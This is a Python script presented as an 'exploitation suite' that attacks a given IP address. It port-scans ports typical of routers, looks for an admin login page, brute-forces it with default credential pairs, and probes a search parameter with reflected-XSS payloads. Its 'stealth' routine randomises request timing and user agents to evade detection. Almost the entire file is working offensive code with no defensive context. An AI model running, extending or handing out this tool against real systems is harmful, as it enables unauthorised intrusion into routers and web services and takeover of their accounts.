
import sys
import socket
import requests
import re
import random
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style

# Custom ASCII Art and Branding
ART = f"""{Fore.CYAN}
███████╗███╗   ██╗██╗ ██████╗ ███╗   ███╗ █████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝████╗  ██║██║██╔════╝ ████╗ ████║██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
█████╗  ██╔██╗ ██║██║██║  ███╗██╔████╔██║███████║    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔══╝  ██║╚██╗██║██║██║   ██║██║╚██╔╝██║██╔══██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████╗██║ ╚████║██║╚██████╔╝██║ ╚═╝ ██║██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚══════╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                {Fore.YELLOW}Network Reconnaissance & Exploitation Suite v1.0{Style.RESET_ALL}
"""

class EnigmaScanner:
    def __init__(self, target):
        print(ART)
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        })
        self.credentials = None
        self.vulnerabilities = []

    def stealth_request(self, method='GET', **kwargs):
        """Make requests with evasion techniques"""
        time.sleep(random.uniform(1.0, 2.5))  # Random delay
        headers = kwargs.get('headers', {})
        headers['User-Agent'] = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)'
        ])
        return requests.request(method, headers=headers, **kwargs)

    def port_scan(self):
        """Scan for open ports"""
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Scanning for open ports...")
        ports = [21, 22, 80, 443, 8080, 7547, 37215, 37443, 37444]
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((self.target, port))
                    if result == 0:
                        service = socket.getservbyport(port, 'tcp') if port <= 1024 else 'unknown'
                        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Port {port}/tcp open {Fore.CYAN}({service}){Style.RESET_ALL}")
            except:
                pass

    def find_admin_panel(self):
        """Locate the admin panel"""
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Hunting for admin panel...")
        paths = ['/', '/admin', '/login', '/config', '/cu.html']
        for path in paths:
            try:
                url = f"http://{self.target}{path}"
                response = self.stealth_request('GET', url=url)
                if response.status_code == 200:
                    if any(keyword in response.text.lower() for keyword in ['password', 'login', 'username']):
                        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Admin panel found: {Fore.CYAN}{url}{Style.RESET_ALL}")
                        return url
            except:
                continue
        return None

    def brute_force_creds(self, login_url):
        """Brute-force credentials"""
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Brute-forcing credentials...")
        creds = [
            ('admin', 'admin'), ('admin', 'password'),
            ('user', 'user'), ('admin', '1234'),
            ('root', 'root'), ('admin', 'admin123')
        ]
        for user, pwd in creds:
            try:
                response = self.stealth_request('POST', url=login_url, data={'username': user, 'password': pwd})
                if 'incorrect' not in response.text.lower() and response.status_code == 200:
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Credentials found: {Fore.CYAN}{user}:{pwd}{Style.RESET_ALL}")
                    self.credentials = (user, pwd)
                    return True
            except:
                continue
        return False

    def scan_for_xss(self):
        """Test for XSS vulnerabilities"""
        print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Testing for XSS vulnerabilities...")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'\"><svg/onload=alert('XSS')>"
        ]
        for payload in payloads:
            try:
                response = self.stealth_request('GET', url=f"http://{self.target}/search?q={payload}")
                if payload in response.text:
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} XSS vulnerability found with payload: {Fore.CYAN}{payload}{Style.RESET_ALL}")
                    self.vulnerabilities.append(('XSS', payload))
            except:
                continue

    def run(self):
        """Main execution flow"""
        self.port_scan()
        admin_panel = self.find_admin_panel()
        if admin_panel:
            if self.brute_force_creds(admin_panel):
                print(f"\n{Fore.GREEN}[+] Success! Logged in with credentials: {Fore.CYAN}{self.credentials[0]}:{self.credentials[1]}{Style.RESET_ALL}")
        self.scan_for_xss()

        if self.vulnerabilities:
            print(f"\n{Fore.YELLOW}[*]{Style.RESET_ALL} Vulnerabilities found:")
            for vuln, payload in self.vulnerabilities:
                print(f"    {Fore.RED}{vuln}{Style.RESET_ALL}: {Fore.CYAN}{payload}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-]{Style.RESET_ALL} No vulnerabilities found.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: {sys.argv[0]} <target_ip> {Style.RESET_ALL}")
        sys.exit(1)

    scanner = EnigmaScanner(sys.argv[1])
    scanner.run()